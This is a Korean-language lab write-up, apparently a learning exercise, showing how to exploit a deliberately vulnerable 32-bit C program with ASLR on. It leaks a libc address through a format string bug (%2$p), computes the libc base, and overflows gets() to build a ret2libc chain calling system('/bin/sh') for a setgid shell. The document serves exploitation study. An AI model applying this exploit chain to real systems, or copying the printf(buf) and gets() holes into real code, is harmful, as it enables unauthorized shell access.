# fsb-bof-ret2libc (ASLR ON)

## 1. 개요

이 실습은 **ASLR이 활성화된 환경**에서
**Format String Vulnerability(FSB)** 를 이용해 **libc 주소를 leak**하고,
같은 실행 흐름에서 **Buffer Overflow(BOF)** 를 통해
**ret2libc 공격으로 쉘을 획득**하는 것을 목표로 한다.

---

## 2. 환경

* Architecture: x86 (32-bit)
* ASLR: ON
* PIE: OFF
* NX: ON
* Stack Canary: OFF

---

## 3. 취약 코드

```c
// filename: vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln(){
    char buf[20];

    puts("input1:");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);        // Format String Vulnerability
  
    puts("input2:");
    gets(buf);          // Buffer Overflow
    printf("%s\n", buf);
}

int main() {
    setregid(getegid(), getegid());
    vuln();
    puts("done");
    return 0;
}
```

### 취약점 요약

* `printf(buf)`
  → 사용자 입력이 포맷 문자열로 해석됨
  → **FSB 발생**
* `gets(buf)`
  → 길이 제한 없음
  → **saved RET overwrite 가능**

---

## 4. 익스플로잇 전체 흐름

1. input1
   * Format String Vulnerability로 **libc 내부 주소 leak**
2. leak된 주소를 기반으로 **libc base 계산**
3. input2
   * BOF로 **saved RET overwrite**
   * `system("/bin/sh")` 호출 (ret2libc)

---  

## 5. libc 주소 leak (FSB)

### 5.1 `%2$p`를 이용한 leak

여러 개의 `%p`를 출력해본 결과,
두 번째 인자가 libc 내부 주소를 가리키는 것으로 의심됐다.

입력:

```
%2$p
```

출력 예시:

```
0xee4d15c0
```

`info proc mappings` 로 확인 결과 해당 값은 libc 매핑 범위에 포함되며,
gdb에서 확인 시 `_IO_2_1_stdin_` 심볼로 해석된다.

```
(gdb) x/i 0xee4d15c0
0xee4d15c0 <_IO_2_1_stdin_>: ...
```

### 5.2 libc base 계산

```
_IO_2_1_stdin_ offset = 0x002315c0
libc_base = leak - offset
```

---

## 6. BOF offset 계산

gdb에서 `vuln()` 함수의 disassembly를 확인한 결과

```asm
lea eax, [ebp-0x1c]
call gets@plt
```

* `buf` 시작 주소: `ebp - 0x1c`
* saved RET 위치: `ebp + 0x4`

따라서:

```
offset = 0x1c + 0x4 = 0x20 (32 bytes)
```

---

## 7. ret2libc 체인 구성

### 7.1 필요한 주소

(libc 기준 오프셋)
```
system : 0x00050430
exit   : 0x0003ebd0
/bin/sh: 0x001c4de8
```

### 7.2 스택 레이아웃 (32-bit, cdecl)

```
[ padding (32 bytes) ]
[ system ]
[ exit ]
[ "/bin/sh" ]
```

#### 원래 상태 (vuln 진입 직후)

```
[높은주소]
+--------------+
│  saved RET   │ 체인 시작점
+--------------+ [ebp+0x4]
│  saved ebp   │
+--------------+ ← ebp
│      ...     │
+--------------+
│              │ buf
+--------------+ [ebp-0x1c]
[낮은주소]
```

#### overflow 이후 실제로 만들어진 스택

```
[높은주소]
+--------------+
│   "/bin/sh"  │ system()의 인자 역할
+--------------+
│     exit()   │ system()의 saved RET 역할
+--------------+
│   system()   │ vuln()의 saved RET (ret로 점프)
+--------------+ [ebp+0x4]
│      AAA     │ 덮인 EBP (의미 없음)
+--------------+ ← ebp
│      ...     │
+--------------+
│      AAA     │ buf
+--------------+ [ebp-0x1c]
[낮은주소]
```

saved return address를 system()으로 덮고,
그 다음 스택 슬롯에 exit()과 "/bin/sh"를 배치함으로써
ret 명령을 함수 호출처럼 활용한다.

---

## 8. 결과

![result](https://github.com/sage-502/pwnable-lab/blob/main/images/fsb-bof-ret2libc/02.png)

* ASLR ON 상태에서도 libc leak 성공
* ret2libc로 setgid 쉘 획득
